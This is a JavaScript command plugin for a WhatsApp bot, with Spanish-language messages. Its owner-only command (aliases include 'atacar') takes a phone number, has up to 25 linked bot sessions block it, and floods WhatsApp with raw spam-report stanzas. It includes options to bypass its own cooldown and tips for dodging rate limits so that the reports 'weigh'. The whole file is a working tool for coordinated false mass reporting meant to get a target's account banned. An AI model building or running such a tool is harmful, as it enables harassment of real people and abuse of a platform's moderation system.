import { getAllSockets } from "../../lib/subbotManager.js";

const OWNERS = ['50578391933', '2599176675473'];
const COOLDOWN_MIN = 30;
const MAX_BOTS = 25;
const HARD_CAP_CYCLES = 6;

const TYPES = ['spam', 'abuse', 'illegal', 'adult', 'false_positive'];
const cooldownMap = new Map();

function sacarNumero(jid) {
    return String(jid || '').split('@')[0].split(':')[0].replace(/\D/g, '');
}

function normalize(raw) {
    if (!raw) return null;
    let d = raw.replace(/\D/g, "");
    if (d.startsWith("00")) d = d.slice(2);
    if (d.length < 8 || d.length > 15) return null;
    return d;
}

function parseType(raw) {
    if (!raw) return 'spam';
    const low = String(raw).toLowerCase();
    return TYPES.includes(low) ? low : 'spam';
}

function checkCooldown(jid, minutes) {
    const now = Date.now();
    const entry = cooldownMap.get(jid);
    if (!entry) return { blocked: false, count: 0, remainingMin: 0 };
    const elapsed = now - entry.lastTime;
    const window = minutes * 60 * 1000;
    if (elapsed >= window) return { blocked: false, count: entry.count, remainingMin: 0 };
    return {
        blocked: true,
        count: entry.count,
        remainingMin: Math.ceil((window - elapsed) / 60000)
    };
}

function markCooldown(jid) {
    const now = Date.now();
    const entry = cooldownMap.get(jid);
    if (entry && (now - entry.lastTime) < COOLDOWN_MIN * 60 * 1000) {
        entry.count++;
        entry.lastTime = now;
        return entry.count;
    }
    cooldownMap.set(jid, { count: 1, lastTime: now });
    return 1;
}

function collectSockets(main) {
    try {
        const subs = getAllSockets() || [];
        const seen = new Set();
        return [main, ...subs].filter(s => {
            if (!s) return false;
            const id = s?.user?.id;
            if (!id || seen.has(id)) return false;
            seen.add(id);
            return true;
        });
    } catch {
        return [main];
    }
}

const wait = ms => new Promise(r => setTimeout(r, ms));

async function runReportPlan({ sockets, plan, concurrency, minGap }) {
    const { jid, type, cycles, keepBlocked } = plan;
    const stats = {
        reports: 0, bots: sockets.length, skipped: 0,
        cyclesOk: 0, cyclesFail: 0, rateLimited: 0, aborted: false
    };

    // Bloquear primero con todos los sockets
    for (const s of sockets) {
        try { await s.chatModify({ block: true }, jid); } catch {}
    }

    const node = {
        tag: "iq",
        attrs: { to: "s.whatsapp.net", type: "set", xmlns: "spam" },
        content: [{ tag: "spam_list", attrs: { jid, spam_flow: type }, content: [] }]
    };

    // Procesar sockets en grupos de concurrencia
    for (let i = 0; i < sockets.length; i += concurrency) {
        const batch = sockets.slice(i, i + concurrency);
        const tasks = batch.map(async (s, idx) => {
            let localOk = 0;
            for (let c = 0; c < cycles; c++) {
                try {
                    await s.query(node, 10000);
                    localOk++;
                    stats.reports++;
                    if (minGap > 0) await wait(minGap);
                } catch (e) {
                    const msg = e?.message || '';
                    if (/rate.?limit|429|too many/i.test(msg)) stats.rateLimited++;
                    break;
                }
            }
            if (localOk === cycles) stats.cyclesOk++;
            else stats.cyclesFail++;
            return localOk > 0;
        });
        await Promise.all(tasks);
    }

    if (!keepBlocked) {
        for (const s of sockets) {
            try { await s.chatModify({ block: false }, jid); } catch {}
        }
    }

    return stats;
}

export default {
    nombre: 'alex',
    categoria: 'Owner',
    alias: ['spam', 'reportar', 'atacar', 'reportnum'],
    descripcion: 'Reporte y bloqueo masivo escalonado (Solo Owner)',
    ejecutar: async ({ sock, msg, argumento, responder }) => {
        const sender = msg.key.participant || msg.key.senderPn || msg.key.remoteJid || '';
        const numeroSender = sacarNumero(sender);
        if (!OWNERS.includes(numeroSender)) return responder.texto('🔒 Acceso denegado. Solo Owner.');

        const args = String(argumento || '').trim().split(/\s+/).filter(Boolean);
        const target = normalize(args[0]);
        if (!target) {
            return responder.texto(
                '⚠️ *Uso incorrecto*\n\n' +
                'Necesito un número válido (8-15 dígitos).\n\n' +
                '*Ejemplo:* .alex 50587258309\n\n' +
                '*Opciones:*\n' +
                '• --tipo=spam|abuse|illegal|adult|false_positive\n' +
                '• --ciclos=1..6 (default 2)\n' +
                '• --bots=1..25 (default 8)\n' +
                '• --gap=1200 (ms, default 1500)\n' +
                '• --unblock (desbloquear al final)\n' +
                '• --forzar (ignorar cooldown)\n' +
                '• --dry (simular)'
            );
        }

        const flags = new Set(args.filter(a => a.startsWith('--') && !a.includes('=')).map(a => a.slice(2)));
        const getNum = (key, fallback) => {
            const hit = args.find(a => a.startsWith(`--${key}=`));
            const n = hit ? Number(hit.split('=')[1]) : NaN;
            return Number.isFinite(n) && n > 0 ? Math.floor(n) : fallback;
        };

        const jid = `${target}@s.whatsapp.net`;
        const type = parseType(args.find(a => a.startsWith('--tipo='))?.split('=')[1]);
        const cycles = Math.min(HARD_CAP_CYCLES, getNum('ciclos', 2));
        const botLimit = Math.min(MAX_BOTS, getNum('bots', 8));
        const minGap = Math.max(600, getNum('gap', 1500));
        const keepBlocked = !flags.has('unblock');
        const dry = flags.has('dry');

        const cd = checkCooldown(jid, COOLDOWN_MIN);
        if (cd.blocked && !flags.has('forzar')) {
            return responder.texto(
                `⏸️ *Ya reportado hace poco*\n\n` +
                `🎯 +${target}\n` +
                `🕒 Visto ${cd.count} vez/veces · reintenta en *${cd.remainingMin} min*\n\n` +
                `Usa \`.alex ${target} --forzar\` para saltarte el cooldown.`
            );
        }

        const sockets = collectSockets(sock).slice(0, botLimit);
        if (!sockets.length) return responder.texto('❌ No hay sesiones operativas.');

        let registered = true;
        try {
            const [res] = (await sock.onWhatsApp(jid)) ?? [];
            registered = Boolean(res?.exists);
        } catch {}
        if (!registered) return responder.texto(`❌ El número *+${target}* no está registrado en WhatsApp.`);

        const concurrency = Math.max(2, Math.ceil(sockets.length / 3));
        const plan = { jid, type, cycles, keepBlocked };

        if (dry) {
            return responder.texto(
                `🧪 *Simulación*\n\n` +
                `🎯 +${target}\n` +
                `🏷️ Tipo: *${type}*\n` +
                `🤖 Bots: *${sockets.length}* (concurrencia ${concurrency})\n` +
                `🔁 Ciclos/bot: *${cycles}*\n` +
                `⏱️ Gap global: ${minGap} ms\n` +
                `🔒 Bloqueo: *${keepBlocked ? 'se mantiene' : 'se revierte al final'}*\n` +
                `📊 IQ totales aprox: *${sockets.length * cycles}*`
            );
        }

        await responder.texto(
            `🚀 *Reporte masivo en curso*\n\n` +
            `🎯 *Objetivo:* +${target}\n` +
            `🏷️ *Motivo:* ${type}\n` +
            `🤖 *Instancias:* ${sockets.length} (${concurrency} simultáneas)\n` +
            `🔁 *Ciclos:* ${cycles} por bot\n` +
            `⏱️ *Ritmo:* 1 op cada ~${minGap} ms\n` +
            `🔒 *Bloqueo final:* ${keepBlocked ? 'mantenido' : 'revertido'}\n\n` +
            `_Tiempo estimado: ${Math.ceil((sockets.length * cycles * minGap * 3) / concurrency / 1000)} s_`
        );

        const started = Date.now();
        const stats = await runReportPlan({ sockets, plan, concurrency, minGap });

        const elapsed = ((Date.now() - started) / 1000).toFixed(1);
        const ratio = stats.bots ? Math.round((stats.cyclesOk / (stats.bots * cycles)) * 100) : 0;
        const tries = markCooldown(jid);

        const lines = [
            stats.cyclesOk > 0 ? '✅ *Operación finalizada*' : '⚠️ *Operación con problemas*',
            '',
            `🎯 +${target} · motivo *${type}*`,
            `📤 Reportes enviados: *${stats.reports}*`,
            `🤖 Instancias útiles: *${stats.bots}* / ${sockets.length}`,
            `🔁 Ciclos correctos: *${stats.cyclesOk}* · fallidos: *${stats.cyclesFail}*`,
            `📈 Efectividad: *${ratio}%* · ⏱️ ${elapsed}s`,
            `🕒 Veces reportado: *${tries}*`
        ];

        if (stats.rateLimited > 0) lines.push(`🐢 Rate-limits: ${stats.rateLimited}`);
        if (ratio >= 80) lines.push('', '_Señal sólida: el reporte debería pesar._');
        else if (ratio < 40) lines.push('', '_Señal débil. Repite con `--gap=2500 --ciclos=1` en 20-30 min._');

        return responder.texto(lines.join('\n'));
    }
};